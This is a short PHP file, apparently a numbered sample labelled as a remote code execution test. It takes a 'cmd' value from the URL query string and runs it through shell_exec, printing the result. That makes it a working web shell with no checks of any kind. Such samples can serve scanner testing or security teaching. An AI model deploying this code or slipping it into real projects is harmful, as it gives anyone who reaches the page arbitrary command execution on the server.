<?php
// RCE test variation #114
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>